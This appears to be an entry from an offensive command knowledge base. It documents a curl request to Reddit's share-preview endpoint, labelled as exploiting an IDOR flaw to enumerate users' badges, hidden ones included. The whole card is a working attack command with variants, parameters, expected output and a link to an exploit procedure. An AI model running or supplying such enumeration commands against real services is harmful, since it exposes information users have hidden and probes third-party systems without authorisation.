---
id: cmd-uuid-2
data: >-
  curl -s
  https://share.redd.it/preview/user/<username>/achievement/<id>?show-user-info=true
  -o badge_<id>.png
tags:
  - http-request
  - idor
  - enumeration
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:33.797Z'
verified: false
validated: true
submitted: true
---
# curl-reddit-badge-preview

## Command

```bash
curl -s https://share.redd.it/preview/user/<username>/achievement/<id>?show-user-info=true -o badge_<id>.png
```

## Description

Send a silent GET request to Reddit's share preview endpoint to check for badge existence. Outputs an image file if the badge exists (even hidden) or error text otherwise; used to exploit IDOR for badge revelation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode (no progress bar) | Yes |
| URL | Preview endpoint with username and ID | Yes |
| `-o` | Output file for response | Yes |

## Examples

### Basic Usage

```bash
curl -s https://share.redd.it/preview/user/example/achievement/10?show-user-info=true -o badge_10.png
```

### Advanced Usage

Check response type:

```bash
curl -s https://share.redd.it/preview/user/example/achievement/10?show-user-info=true | head -c 10
```

## Expected Output

Binary image data saved to file for existing badges; 'Not Found' text for non-existent ones.

## Related

- [[procedures/Exploit-IDOR-in-Share-Preview-Endpoint]]
